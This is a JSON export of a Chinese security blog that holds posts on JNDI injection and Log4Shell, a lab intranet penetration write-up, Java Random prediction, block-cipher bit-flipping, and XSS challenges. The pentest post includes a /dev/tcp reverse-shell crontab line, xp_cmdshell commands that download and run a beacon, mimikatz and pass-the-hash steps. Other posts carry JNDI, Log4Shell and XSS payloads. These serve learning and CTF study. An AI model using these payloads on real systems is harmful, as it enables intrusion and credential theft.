{"meta":{"title":"Hexo","subtitle":"","description":"","author":"r1ngs","url":"https://0xr1ngs.github.io","root":"/"},"pages":[{"title":"文章归档","date":"2023-06-19T12:43:47.648Z","updated":"2023-06-18T07:49:56.844Z","comments":true,"path":"archive.html","permalink":"https://0xr1ngs.github.io/archive.html","excerpt":"","text":""}],"posts":[{"title":"Jndi注入","slug":"Java-Jndi","date":"2023-06-19T11:21:26.000Z","updated":"2023-07-10T09:13:55.994Z","comments":true,"path":"2023/06/19/Java-Jndi/","link":"","permalink":"https://0xr1ngs.github.io/2023/06/19/Java-Jndi/","excerpt":"","text":"JNDI注入JNDI全称为Java Naming and Directory Interface（Java命名和目录接口），是SUN公司提供的一种标准的Java命名系统接口 命名服务是一种简单的键值对绑定，可以通过键名检索值，RMI就是典型的命名服务 目录服务通常使用树状结构来组织信息，LDAP是典型的目录服务，Active Directory是LDAP在Windows上的实现，OpenLDAP 是在 Linux 上的实现 JNDI_RMI服务端： package org.RmiDemo; import java.rmi.Naming; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.rmi.server.UnicastRemoteObject; public class Server { public static class RMIInstance extends UnicastRemoteObject implements IHello{ // 绑定到RMI的对象的类必须要继承自UnicastRemoteObject，并且要实现一个继承自java.rmi.Remote的接口 // 构造方法 protected RMIInstance() throws RemoteException { } // 实现接口 @Override public String sayHello(String name) throws RemoteException { return \"hello, \" + name; } } public static void main(String[] args) throws Exception { LocateRegistry.createRegistry(1099); RMIInstance rmiInstance = new RMIInstance(); Naming.bind(\"rmi://127.0.0.1/hello\",rmiInstance); } } 接口： package org.RmiDemo; import java.rmi.Remote; import java.rmi.RemoteException; public interface IHello extends Remote { // 必须抛出java.rmi.RemoteException异常 String sayHello(String name) throws RemoteException; } 客户端： package org.RmiDemo; import javax.naming.Context; import javax.naming.InitialContext; import java.util.Hashtable; public class Client { public static void main(String[] args) throws Exception{ // JNDI环境变量 Hashtable&lt;String, String> env = new Hashtable&lt;>(); env.put(Context.INITIAL_CONTEXT_FACTORY, \"com.sun.jndi.rmi.registry.RegistryContextFactory\"); env.put(Context.PROVIDER_URL, \"rmi://127.0.0.1\"); // javax.naming.InitialContext上下文 Context initialContext = new InitialContext(env); Object obj = initialContext.lookup(\"hello\"); if (obj instanceof IHello){ IHello myHello = (IHello) obj; // 强转为IHello实例，并且赋给IHello类型的引用变量 System.out.println(myHello.sayHello(\"world\")); } } } 动态协议转换:initialContext.lookup指定的参数可控 package org.RmiDemo; import javax.naming.Context; import javax.naming.InitialContext; public class Client { public static void main(String[] args) throws Exception{ // 不指定环境变量 Context initialContext = new InitialContext(); // 通过用户输入来动态识别调用的服务 Object obj = initialContext.lookup(\"rmi://127.0.0.1/hello\"); if (obj instanceof IHello){ IHello myHello = (IHello) obj; // 强转为IHello实例，并且赋给IHello类型的引用变量 System.out.println(myHello.sayHello(\"world\")); } } } 则可以指定一个攻击者的rmi服务，实例化恶意类达成攻击。但是恶意类在服务器端并不存在，也就调用不了方法，因此需要Reference类。如果远程获取RMI服务上的对象为Reference类或者其子类，则在客户端获取到远程对象存根实例时，可以从其他服务器上加载class文件来进行实例化。 // Constructs a new reference for an object with class name 'className', and the class name and location of the object's factory. // Params: // className – The non-null class name of the object to which this reference refers. // factory – The possibly null class name of the object's factory. // factoryLocation – The possibly null location from which to load the factory (e.g. URL) public Reference(String className, String factory, String factoryLocation) { this(className); classFactory = factory; classFactoryLocation = factoryLocation; } package org.RmiDemo; import java.rmi.Naming; import com.sun.jndi.rmi.registry.ReferenceWrapper; import javax.naming.Reference; import java.rmi.registry.LocateRegistry; public class Server { public static void main(String[] args) throws Exception { LocateRegistry.createRegistry(1099); Reference reference = new Reference(\"Arbitrary\",\"Evil\",\"&lt;http://127.0.0.1:8888/>\"); // Reference没有继承UnicastRemoteObject，因此需要com.sun.jndi.rmi.registry.ReferenceWrapper进行包装 ReferenceWrapper refObjWrapper = new ReferenceWrapper(reference); Naming.bind(\"rmi://127.0.0.1/hello\",refObjWrapper); System.out.println(\"Server Running.\"); } } 在这个例子中，factory是工厂类，会去直接寻找 http://127.0.0.1:8888/Evil.class文件，然后实例化，我们可以直接在工厂类的构造方法中执行代码，或者在静态代码块中执行。因此，className可以是任意的。 Class.forName(name)会执行”类的初始化“，先后调用static、{}、构造函数 import java.io.IOException; public class Evil { public Evil() throws IOException { Runtime.getRuntime().exec(\"calc\"); } static { try { Runtime.getRuntime().exec(\"calc\"); } catch (IOException var1) { throw new RuntimeException(var1); } } } 然后用同版本（否则会报 Unsupported major.minor）jdk编译：javac [Evil.java](&lt;http://Evil.java&gt;) ，将其放入 http://127.0.0.1:8888 目录下，运行客户端代码即可弹出两次计算器（虽然会报 Evil cannot be cast to javax.naming.spi.ObjectFactory 但代码还是执行了）。 JDK 6u45、7u21之后：java.rmi.server.useCodebaseOnly的默认值被设置为true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前JVM的java.rmi.server.codebase指定路径加载类文件。使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。 JDK 6u141、7u131、8u121之后：增加了com.sun.jndi.rmi.object.trustURLCodebase选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。 JDK 6u211、7u201、8u191之后：增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。 JdbcRowSetImpl通过JdbcRowSetImpl也能触发： package org.RmiDemo; import com.sun.rowset.JdbcRowSetImpl; public class Client { public static void main(String[] args) throws Exception{ System.setProperty(\"com.sun.jndi.ldap.object.trustURLCodebase\", \"true\"); JdbcRowSetImpl JdbcRowSetImpl_inc = new JdbcRowSetImpl(); JdbcRowSetImpl_inc.setDataSourceName(\"rmi://127.0.0.1/hello\"); JdbcRowSetImpl_inc.setAutoCommit(true); } } 触发点在setAutoCommit，参数是true还是false没有影响。 实验环境为 jdk 1.8.0_202，由于trustURLCodebase为false，如果不手动开启的话会报错：Exception in thread &quot;main&quot; java.lang.ClassCastException: javax.naming.Reference cannot be cast to javax.sql.DataSource 快速搭建JNDI环境： https://github.com/welk1n/JNDI-Injection-Exploit https://github.com/mbechler/marshalsec 8u191以后可以通过加载本地危险工厂类实现代码执行 https://github.com/veracode-research/rogue-jndi Log4shell可以用Springboot启动一个环境，maven依赖如下配置 &lt;dependencies> &lt;dependency> &lt;groupId>org.springframework.boot&lt;/groupId> &lt;artifactId>spring-boot-starter-web&lt;/artifactId> &lt;exclusions> &lt;!--先排除...--> &lt;exclusion> &lt;groupId>org.apache.logging.log4j&lt;/groupId> &lt;artifactId>log4j-to-slf4j&lt;/artifactId> &lt;/exclusion> &lt;/exclusions> &lt;/dependency> &lt;dependency> &lt;groupId>org.apache.logging.log4j&lt;/groupId> &lt;artifactId>log4j-api&lt;/artifactId> &lt;version>2.14.0&lt;/version> &lt;/dependency> &lt;dependency> &lt;groupId>org.apache.logging.log4j&lt;/groupId> &lt;artifactId>log4j-core&lt;/artifactId> &lt;version>2.14.0&lt;/version> &lt;/dependency> &lt;/dependencies> 可以先测试是否能解析（高版本已经默认关闭解析）： Logger logger = LogManager.getLogger(BasicController.class); logger.error(\"name:{}\", \"${java:runtime}\"); logger.error(\"name:{}\", \"${jndi:dns://d4b3766c.ipv6.1433.eu.org}\"); 通过一个简单的controller测试： @Controller public class BasicController { private static final Logger logger = LogManager.getLogger(BasicController.class); // &lt;http://127.0.0.1:8080/hello?name=lisi> @RequestMapping(\"/hello\") @ResponseBody public String hello(@RequestParam(name = \"name\", defaultValue = \"unknown user\") String name) { logger.error(\"name: \" + name); return \"Hello \" + name; } ... //SpringDemoApplication.java System.setProperty(\"com.sun.jndi.ldap.object.trustURLCodebase\", \"true\"); SpringApplication.run(SpringDemoApplication.class, args); 访问http://127.0.0.1:8080/hello?name=%24{jndi%3Aldap%3A%2F%2F127.0.0.1%3A1389%2Fcuizgz}即可执行恶意命令。","categories":[{"name":"Web","slug":"Web","permalink":"https://0xr1ngs.github.io/categories/Web/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://0xr1ngs.github.io/tags/Java/"}]},{"title":"一次内网渗透测试","slug":"LGP-内网渗透","date":"2022-07-16T12:02:14.000Z","updated":"2023-07-10T09:14:54.112Z","comments":true,"path":"2022/07/16/LGP-内网渗透/","link":"","permalink":"https://0xr1ngs.github.io/2022/07/16/LGP-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/","excerpt":"","text":"前言师兄搭建的一个学习环境，从SSRF到docker逃逸再到mssql和PTH移动，记录一下WP 外网跳板http://192.168.34.244/ 不能用http，能用file，但是过滤了www等，看不了index.php，可以用url编码绕过还可以用 /proc/self/cwd Linux proc &#x2F;proc是一种伪文件系统（也即虚拟文件系统），存储的是当前内核运行状态的一系列特殊文件，用户可以通过这些文件查看有关系统硬件及当前正在运行进程的信息，甚至可以通过更改其中某些文件来改变内核的运行状态。 /proc/self/cwd是一个软连接，指向用户目录，如果是web用户就指向web目录，也可以用来绕过，还比如 /proc/net/arp 深入理解linux系统下proc文件系统内容 - zhezhelin - 博客园 可以看 /etc/hosts 这台的ip是172.17.0.2，arp还能看到一个.0.1 web目录留了一个phpshell和root密码，可以直接查找匹配&#x2F;etc文件夹下的所有文件 grep -rn &quot;root&quot; * 在蚁剑的shell里面不能 su root,这样没法输密码，直接就会返回 Password: su: Authentication failure 可以弹一个 meterpreter，在 meterpreter里进入shell，然后用 su root，然后再以root权限执行 shell.elf,这样就可以获得一个root的 meterpreter docker 逃逸特权模式挂载用户目录 fdisk -l mkdir /test mount /dev/sda1 /test 这样相当于把宿主机的根目录挂载到了 /test 可以通过 test进行文件读写。 但是不能直接去 test目录执行 /bin/bash 只能通过写入 ssh key或者 crontab的形式 但是注意，不能直接把反弹shell的命令写到任务里，而是应该写入一个sh文件 */1 * * * * /bin/bash -i >&amp; /dev/tcp/192.168.33.116/12501 0>&amp;1 ❌ */1 * * * * root bash /tmp/shell.sh ✅ 原因： 解决ubuntu crontab反弹shell失败的问题 简单来说就是 centos里面的 cron中执行的 shell环境是 /bin/sh，ubuntu中 /bin/sh这个软连接指向了 dash 。但是不执行 dash直接执行 /test/bin/bash也是不行的。因为没有用 chroot切换 /test为根目录，而且弹过来的也不是宿主机的 shell，因为这样相当于在原来基础上只是加了一个 /bin/bash而已 同时，如果前面的crontab任务有错，后面的应该也是不执行的，比如前一句忘了写执行的用户 /etc/crontab 和 /var/spool/cron区别：/var/spool/cron/这个目录是以账号来区分每个用户自己的执行计划，而 /etc/crontab系统执行计划，需要在五个*后面加上用户，比如上面没有写到 /etc/crontab没有加root就是错误的 然后现在通过反弹的shell再弹 meterpreter就有宿主机shell了 内网移动mssql[+] NetInfo: [*]172.16.2.4 [->]MSSQL [->]172.16.2.4 [+] NetInfo: [*]172.16.2.2 [->]outx-rivate-PC [->]172.16.2.2 [+] NetInfo: [*]172.16.2.1 [->]DC [->]172.16.2.1 [+] 172.16.2.1 MS17-010 (Windows Server 2012 R2 Datacenter 9600) [+] 172.16.2.2 MS17-010 (Windows 7 Professional 7601 Service Pack 1) 不拿17-010打了，打 mssql ，密码在web配置文件里有，但是这台mssql只连通 172.16.2.0网段，要反弹回来的话只能在跳板机做一个端口转发，跳板机做server，攻击机做client，payload反弹到server的 12001端口相当于反弹到了client的 12001端口，listener这样设置 172.16.2.12就是跳板机的一个网卡ip，攻击机的 frpc.ini 配置为 [common] tls_enable = true token = qax_scu server_addr = 192.168.34.244 server_port = 7200 [http_proxy] type = tcp remote_port =12001 plugin=http_proxy local_port =12001 local_ip =127.0.0.1 然后不能用cs直接通过listener生成payload，然后mssql_exec执行，因为经过排查后发现这样生成的payload根本没有走http流量，可能是个cs的bug，所以只能生成exe文件然后下载执行。 其次，msf的mssql_exec模块如果返回有中文字符会直接报错，建议直接用navicat 跳板机有python3，起一个http.server就可以，然后下载到progamdata执行 exec master..xp_cmdshell \"powershell Invoke-WebRequest &lt;http://172.16.2.12:12345/beacon.exe> -OutFile C://programdata/beacon.exe\" exec master..xp_cmdshell \"C://programdata/beacon.exe\" 提权mssql是 nt/service权限，用 ms16-075一键提权，弹回新的shell，然后hashdump和mimikatz hashdump 安全账户管理器（SAM）是Windows XP、Windows Vista、Windows 7、8.1、10和11中的一个数据库文件，用于存储用户的密码。它可以用来验证本地和远程用户。从Windows 2000 SP4开始，活动目录（AD）对域用户的尝试登陆进行认证。SAM使用加密措施来防止未经认证的用户访问系统。 SAM数据库文件存储在C:\\Windows\\System32\\config中。该文件中的所有数据都是加密的。密码哈希值存储在HKEY_LOCAL_MACHINE&#x2F;SAM中。即使它存储在本地，任何系统用户在运行时都不能访问该文件。出于安全考虑，对SAM的访问有不同的权限。访问它需要HKLM&#x2F;SAM和SYSTEM的权限。 hashdump是pwdump工具的内存版本，但它不是将DLL加载到LSASS.exe，而是在进程中分配内存，注入原始汇编代码，通过CreateRemoteThread执行，然后从内存中读回捕获的哈希值。 hashdump返回的结果格式为： Username:RID:LM-HASH:NTLM-HASH cmd5支持NTLM解密 mimikatz Mimikatz是一个开源的应用程序，允许用户查看和保存认证凭证，如Kerberos门票。 本地安全授权服务器服务（LSASS）是微软Windows操作系统中的一个进程，负责执行系统的安全策略。它验证登录到Windows计算机或服务器的用户，处理密码变更，并创建访问令牌。 它还会向Windows安全日志写入内容。 Windows使用的lsass.exe文件位于%WINDIR%\\System32目录下，该文件的描述是本地安全授权进程。强行终止lsass.exe会导致系统失去对任何账户的访问权，包括NT AUTHORITY，促使机器重新启动。 深入分析Mimikatz：WDigest 大概原理就是将任意DLL载入LSASS PTH原理一台windows计算机要么属于一个工作组，要么属于一个域。工作组中的每一台计算机在网络中地位平等，是独立管理的个体。域的优点在于1）集中的统一账户、资源管理。2）工作站的有效配置和安全性严密控制（比如给所有机器统一发放补丁等）。当计算机数量比较多，大型企业中网络规模大，需要统一的管理和集中的身份验证，并且能够给用户提供方便的搜索和使用网络资源的方式就应该使用域。域用户信息保存在活动目录(AD)中。 域是Windows计算机网络的一种形式，其中所有用户帐户 、计算机、打印机和其他安全主体都在位于称为域控制器（DC）的一个或多个中央计算机集群上的中央数据库中注册。 身份验证在域控制器上进行， 在域中使用计算机的每个人都会收到一个唯一的用户帐户，然后可以为该帐户分配相应的该域内资源的访问权限。 从Windows Server 2003开始 ， Active Directory是负责维护该中央数据库的Windows组件。 内网渗透入门–域相关概念 AD 域服务简介（一）- 基于 LDAP 的 AD 域服务器搭建及其使用 浅探内网横向移动-Pass The Hash - 先知社区 自window vista之后没办法使用RID非500的本地管理员用户来进行Pass The Hash, 但是如果是域用户且该域用户属于本地Administrators组的成员也可以进行pass the hash shell net user /domain \\\\\\\\DC.outx.com 的用户帐户 ------------------------------------------------------------------------------- Administrator Guest krbtgt outx 命令成功完成。 其中，KRBTGT账户是一个本地默认账户，作为密钥分发中心（KDC）服务的一个服务账户。这个账户不能被删除，账户名称也不能被改变。KRBTGT账户不能在活动目录中启用。在创建域的时候会自动创建这个账户。 IPC$及利用beacon> net share [*] Tasked beacon to run net share on localhost [+] host called home, sent: 105058 bytes [+] received output: Shares at \\\\\\\\localhost: Share name Comment ---------- ------- ADMIN$ 远程管理 C$ 默认共享 IPC$ 远程 IPC pth .\\\\outx ecde4d7a314541d34854ec83c114634b shell dir \\\\\\\\dc\\\\c$ #当访问softer计算机中名为it168的共享文件夹，用UNC表示就是\\\\\\\\softer\\\\it168； #如果是softer计算机的默认管理共享C$则用\\\\\\\\softer\\\\c$来表示。 #如果继续： shell dir \\\\\\\\dc\\\\c$\\\\Users IPC$共享是由Windows服务器服务创建的。这个特殊共享的存在是为了允许后续的命名管道连接到服务器。服务器的命名管道是由内置的操作系统组件和安装在系统上的任何应用程序或服务创建的。当命名管道被创建时，该进程指定了与该管道相关的安全性。然后，它确保 只向指定的用户或组授予访问权 。 IPC$共享也被称为空会话连接。通过使用该会话，Windows允许匿名用户执行某些活动，如列举域账户和网络共享的名称。 net use：将一台计算机连接到共享资源，或将一台计算机从共享资源中断开，或显示有关计算机连接的信息。 net use \\\\\\\\靶机ip地址\\\\ipc$ \"密码\" /user:\"用户名\" net use 然后可以通过这个链接上传文件等等，比如 copy user.bat \\\\\\\\192.168.1.108\\\\c$ IPC$入侵大全 CS攻击在cs里，视图⇒目标⇒添加目标，添加DC，输入ip地址，然后psexec PsExec是一个轻量级的telnet替代软件，可以让你在其他系统上执行程序，为控制台应用程序提供完整的交互性，而不需要手动安装客户端软件。PsExec最强大的用途包括在远程系统上启动交互式命令程序和远程启用工具，如IpConfig，否则就不能显示远程系统的信息。 横向移动 - PsExec 的使用 直接就上线了，PC机也可以这么做","categories":[{"name":"Web","slug":"Web","permalink":"https://0xr1ngs.github.io/categories/Web/"}],"tags":[{"name":"内网渗透","slug":"内网渗透","permalink":"https://0xr1ngs.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"}]},{"title":"Java Random方法的安全问题","slug":"java-random","date":"2019-05-31T08:37:35.000Z","updated":"2023-07-10T09:47:36.581Z","comments":true,"path":"2019/05/31/java-random/","link":"","permalink":"https://0xr1ngs.github.io/2019/05/31/java-random/","excerpt":"","text":"前言起源于强网杯的密码学题目random study java.util.Random题目中challenge two的主要代码如下： o = subprocess.check_output([\"java\", \"Main\"]) tmp=[] for i in o.split(\"\\n\")[0:3]: tmp.append(int(i.strip())) v1=tmp[0] % 0xffffffff v2=tmp[1] % 0xffffffff v3=tmp[2] % 0xffffffff 还给了一个Main.class文件，打开发现是字节码，用jd-gui反编译得到源码如下： public class Main { public static void main(String[] paramArrayOfString) { Random random = new Random(); System.out.println(random.nextInt()); System.out.println(random.nextInt()); System.out.println(random.nextInt()); } } 代码的意思很简单，调用random.nextInt方法生成三个连续的随机数，要求根据前两个随机数去预测第三个随机数 源码分析为了了解这个方法出现的安全问题的原理，有必要去查看一下这个方法的源代码 在eclipse中将光标移动到nextInt处按F3可以追踪到jdk包里的具体代码 可以看到它直接调用了next方法，传递的参数是32。 继续追踪next方法 可以看到前一个随机数种子和后一个随机数种子都是定义为long类型的，方法返回的值就是下一个种子右移16位然后强转为int的结果 while里的compareAndSet方法只是比较当前的种子值是否为oldseed，如果是的话就更新为nextseed而已，一般都会返回true 而下一个种子的更新算法就在do-while循环里面：nextseed = (oldseed * multiplier + addend) &amp; mask，种子的初始值是将当前系统时间带入运算的结果 可以在类定义的开头处看到这几个常量属性的值 而这个种子的更新算法本质上就是一个线性同余生成器 线性同余生成器（LCG）LCG是形如这样的式子： 和上面的代码对比可以看出是基本一致的，因为和mask常量做与运算就相当于是舍弃高位，保留2进制的低48位，也就相当于模2的48次方 那么我们既然都有了常量的值了，我们就可以去做第三个随机数的预测了 预测方法很简单，如果把生成第一个随机数的种子定义为seed1，seed2、seed3往后顺延的话 seed1右移16位就是第一个随机数的值，也就是说第一个随机数就丢失了16位，所以seed1就有2的16次方种可能，那么把这2的16次方种可能带入计算下一个seed2，并且右移查看是否和第二个随机数相等就能知道是否正确找到了seed1了 先看一组简单的测试样例，输出的三个随机数都是正数 a = 0x5DEECE66DL b = 0xBL mask = (1L &lt;&lt; 48) - 1 def findseed(x1, x2): seed = x1 &lt;&lt; 16 for i in range(2 ** 16): if ((a * seed + b) &amp; mask) >> 16 == x2: return seed seed += 1 if __name__ == '__main__': x1 = 1564370740 x2 = 2121441037 seed1 = findseed(x1, x2) seed2 = (a * seed1 + b) &amp; mask x3 = ((a * seed2 + b) &amp; mask) >> 16 print x3 通过测试，结果正确 但是你可能会好奇为什么测试的java代码有时候会输出负数，因为右移1位是相当于除以2的，一个正数除以一个正数怎么会得到一个负数呢？ 实际上这是由于java代码中的int强制类型转换和&gt;&gt;&gt;无符号右移所造成的 补码先来回顾一下java的int类型，int类型占四个字节，也就是二进制的32位 计算机中的数字通常用二进制补码表示，最高位为符号位，正数为0，负数为1，所以表示数值的一共有31位，故int类型的最小值为-2147483648（-2的31次方）最大值为 2147483647（2的31次方-1） 你可能会好奇为什么负数比正数多表示了1位，因为自然数0就是用全为0（包括符号位）的二进制表示的，而到负数那里是没有负0的概念的，所以可以多表示一个数 接下来可以开始说&gt;&gt;&gt;的意思了 java中有两种右移，一种是&gt;&gt;，代表逻辑上的右移(除以)，高位补为符号位；一种是&gt;&gt;&gt;代表无符号右移，高位直接补0 看一下这种情况： 前两个为正数，但是第三个为负数，我们先按照上面的方法计算出seed3和它右移16位的结果： a = 0x5DEECE66DL b = 0xBL mask = (1L &lt;&lt; 48) - 1 def findseed(x1, x2): seed = x1 &lt;&lt; 16 for i in range(2 ** 16): if ((a * seed + b) &amp; mask) >> 16 == x2: return seed seed += 1 if __name__ == '__main__': x1 = 1135971603 x2 = 1130772191 seed1 = findseed(x1, x2) seed2 = (a * seed1 + b) &amp; mask seed3 = (a * seed2 + b) &amp; mask print seed3 print seed3.bit_length() print '{:064b}'.format(seed3) print '{:064b}'.format(seed3>>16) 输出结果为 141635148990318 48 0000000000000000100000001101000100000000101111100100011101101110 0000000000000000000000000000000010000000110100010000000010111110 这样就能看出问题在哪了，由于seed3右移了16位以后除了补0的高位就只有32位了，使用int强转以后java把它从long类型转换成了int，并且自动忽略了32位以后的高位，这就相当于我们得到的第三个随机数用补码表示为 10000000110100010000000010111110 可以看出来最高位为1，也就是说这个补码代表了一个负数，那么我们怎么通过补码找到这个负数的真值呢？很简单，对补码再求一次补码就行了，也就是取反后加1。 即 01111111001011101111111101000010，对应的二进制位2133786434，所以第三个随机数应该为-2133786434，如此一来，我们就可以通过负数找到其对应的seed了 exp最终通过两个随机数预测第三个随机数的exp如下： a = 0x5DEECE66DL b = 0xBL mask = (1L &lt;&lt; 48) - 1 def n2p(x): y = -x y ^= 2 ** 32 - 1 #取反 y += 1 return y def findseed(x1, x2): if x1 &lt; 0: x1 = n2p(x1) if x2 &lt; 0: x2 = n2p(x2) seed = x1 &lt;&lt; 16 for i in range(2 ** 16): if ((a * seed + b) &amp; mask) >> 16 == x2: return seed seed += 1 def cal_x(seed): x = seed>>16 if '{:032b}'.format(x).startswith('1'): x ^= 2 ** 32 - 1 x += 1 return -x return x if __name__ == '__main__': x1 = 187562908 x2 = 1663125607 seed1 = findseed(x1, x2) seed2 = (a * seed1 + b) &amp; mask seed3 = (a * seed2 + b) &amp; mask x3 = cal_x(seed3) print x3 经过测试，无论x1或者x2是否为负数，都可以准确预测 总结以前学习LCG的时候，只是知道了它的原理，并没有接触到它在实际情况中的应用，通过这次比赛，学到了java的random方法的安全漏洞，同时也十分感谢出题人提供的学习机会","categories":[{"name":"Crypto","slug":"Crypto","permalink":"https://0xr1ngs.github.io/categories/Crypto/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://0xr1ngs.github.io/tags/Java/"}]},{"title":"对字节反转攻击的深入研究","slug":"cbc-bit-flip","date":"2019-03-28T08:28:53.000Z","updated":"2023-07-10T09:13:19.810Z","comments":true,"path":"2019/03/28/cbc-bit-flip/","link":"","permalink":"https://0xr1ngs.github.io/2019/03/28/cbc-bit-flip/","excerpt":"","text":"对字节反转攻击的深入研究前言现在无论你是google还是百度，”字节反转攻击”的搜索结果整整几页都是”CBC字节反转攻击”，看来字节反转攻击和CBC模式结合的想法已经可以说是深入人心，毕竟它的名字就叫”CBC反转字节攻击”，但是不是这种攻击只有CBC分组模式才有呢？如果不用CBC分组模式，是不是就不存在这种重放攻击呢？笔者就这个问题进行了研究。 CBCCBC模式下的字节反转攻击想必大家都不陌生了，这种攻击方式和分组加密的加密算法无关，是在处理明文加密后的密文块时出现了漏洞：前一块的密文可以影响后一块的明文。 这种图引用自国外一个大佬的文章，攻击手法是简单明了的： C1 xor D(C2) &#x3D; P2 那么我们令C1&#x3D;C1 xor P2 xor P发送给服务器，其中P是我们想要篡改的明文，那么服务器会计算： (C1 xor P2 xor P) xor D(C2) &#x3D; (P2 xor D(C2)) xor P2 xor P xor D(C2) &#x3D; P 也就达到了篡改的效果，下面是作者自己写的测试demo from Crypto.Cipher import AES from os import urandom from Crypto.Util.strxor import strxor class AES_CBC: def __init__(self): self.key = urandom(16) self.iv = urandom(16) def encrypt(self, plain): aes = AES.new(self.key, AES.MODE_CBC, self.iv) return aes.encrypt(plain) def decrypt(self, cipher): aes = AES.new(self.key, AES.MODE_CBC, self.iv) return aes.decrypt(cipher) plain = '1'*32 aes = AES_CBC() cipher = aes.encrypt(plain) print aes.decrypt(cipher) cipher = strxor(strxor(cipher[:16], '1'*16), '2'*16)+cipher[16:] print aes.decrypt(cipher) 运行结果为： 前16个字节乱码是因为我们篡改了C1后，对应的D(C1)也发生了改变 CFBCFB模式可以将块密码转换为同步的流密码。流密码通俗点讲就是将明文逐字节的进行加密，它生成密钥流块，然后与明文块进行异或，然后获得密文。 先来看一下CFB的加解密模式吧，图片选自wikipedia： 那么按道理说，我们如果将密文的第一块反转，那么明文的第一块也应该被对应篡改，但事实并非如此，我们看这个测试demo from Crypto.Cipher import AES from os import urandom from Crypto.Util.strxor import strxor class AES_CFB: def __init__(self): self.key = urandom(16) self.iv = urandom(16) def encrypt(self, plain): aes = AES.new(self.key, AES.MODE_CFB, self.iv) return aes.encrypt(plain) def decrypt(self, cipher): aes = AES.new(self.key, AES.MODE_CFB, self.iv) return aes.decrypt(cipher) plain = '1'*32 aes = AES_CFB() cipher = aes.encrypt(plain) print aes.decrypt(cipher) ct = strxor(strxor(cipher[:16], '1'*16), '2'*16)+cipher[16:] print aes.decrypt(ct) 运行结果如下： 一片乱码？但是如果你仔细观察的话，会发现其实第一个字符已经被改成了2，那为什么后面的都是乱码呢？ 我们修改一下代码，只更改第一个字符： ct = strxor(strxor(cipher[:1], '1'*1), '2'*1)+cipher[1:] 程序运行结果如下： 第一个字符依然是2，但是为什么后面有15个字符没有被篡改呢？ 其实，wikipedia的图并不能很好的展示CFB的工作模式 ，真实的CFB模式是这样的： 图中的Shift register代表的是移位寄存器，图中的s一般代表的是8bit也就是1字节，同时，如果我们更改了Ci，那么Ci是要被存放到下一个移位寄存器里的，并且这个Ci会一直保存在寄存器里，直到它慢慢从寄存器移出去，所以这个Ci会影响128&#x2F;8&#x3D;16个字节的明文，故最后有32-1-16&#x3D;15个字节的明文没有受影响，所以，CFB模式也是有字节反转攻击的，只是我们每次只能改动一个字节，完整的攻击demo如下： from Crypto.Cipher import AES from os import urandom from Crypto.Util.strxor import strxor class AES_CFB: def __init__(self): self.key = urandom(16) self.iv = urandom(16) def encrypt(self, plain): aes = AES.new(self.key, AES.MODE_CFB, self.iv) return aes.encrypt(plain) def decrypt(self, cipher): aes = AES.new(self.key, AES.MODE_CFB, self.iv) return aes.decrypt(cipher) plain = '1'*32 aes = AES_CFB() cipher = aes.encrypt(plain) print aes.decrypt(cipher) for i in range(32): pt = aes.decrypt(cipher) cipher = cipher[:i]+strxor(strxor(cipher[i], pt[i]), '2')+cipher[i+1:] print aes.decrypt(cipher) 程序运行结果为： OFBOFB和CFB类似，也是将块密码转换为流密码的一种分组模式，加解密图示如下： 可以从解密模式发现，OFB模式和CBC模式比较相似，并且如果其中一块的密文进行了改变的话，并不会影响它后面的密文 所以类似的，OFB模式也存在字节反转攻击，同时由于流密码的性质，我们可以很简单的做到对明文任意长度字符的篡改 demo如下： from Crypto.Cipher import AES from os import urandom from Crypto.Util.strxor import strxor class AES_OFB: def __init__(self): self.key = urandom(16) self.iv = urandom(16) def encrypt(self, plain): aes = AES.new(self.key, AES.MODE_OFB, self.iv) return aes.encrypt(plain) def decrypt(self, cipher): aes = AES.new(self.key, AES.MODE_OFB, self.iv) return aes.decrypt(cipher) plain = '1'*32 aes = AES_OFB() cipher = aes.encrypt(plain) print aes.decrypt(cipher) for i in range(32): ct = strxor(strxor(cipher[:i+1], '1'*(i+1)), '2'*(i+1))+cipher[i+1:] print aes.decrypt(ct) 运行结果如下 总结虽然名字叫做”CBC字节反转攻击”，但并不是只有CBC模式才会有这种攻击手法，CFB和OFB模式都是不能抵御这种攻击的，不能认为如果不用CBC模式以后就能完全避免这种密文重放攻击了。","categories":[{"name":"Crypto","slug":"Crypto","permalink":"https://0xr1ngs.github.io/categories/Crypto/"}],"tags":[{"name":"cbc","slug":"cbc","permalink":"https://0xr1ngs.github.io/tags/cbc/"}]},{"title":"xss总结","slug":"xss","date":"2018-08-21T06:02:19.000Z","updated":"2023-07-10T09:15:17.488Z","comments":true,"path":"2018/08/21/xss/","link":"","permalink":"https://0xr1ngs.github.io/2018/08/21/xss/","excerpt":"","text":"在进行haozi师傅的XSS过关挑战中学到了不少东西，参考了学长的wp，发出来总结一下 题目链接 0x00&lt;script>alert(1)&lt;/script> 最简单的 0x01&lt;/textarea>&lt;script>alert(1)&lt;/script> 闭合标签 0x02\">&lt;script>alert(1)&lt;/script>&lt;\" 原理同上 0x03&lt;script>alert`1`&lt;/script> 这道题waf了小括号 可以用反引号绕过 0x04这道题卡了好久，先来看看server code function render (input) { const stripBracketsRe = /[()`]/g input = input.replace(stripBracketsRe, '') return input } g表示全局匹配，将反引号或 (或 )替换成空这样的话只能考虑一下编码绕过我一开始的想法是使用js编码，但实际测试是不行的在学长的wp下面发现了这篇文章，抢救了我对编码知识的盲区浅谈XSS—字符编码和浏览器解析原理文中不同的标签浏览器的解析顺序不同，开头和结尾各给了几个例子原理是因为：小括号、单引号、双引号这些控制字符在js解码的时候仅仅会被解码为文本字符串而只有标识符名称不会被当做字符串，所以不能弹窗这道题有两种办法绕过 &lt;img src=1 onerror=alert&amp;#40;1&amp;#41;&gt; &lt;svg&gt;&lt;script&gt;alert&amp;#40;1&amp;#41;&lt;/script&gt;&gt; 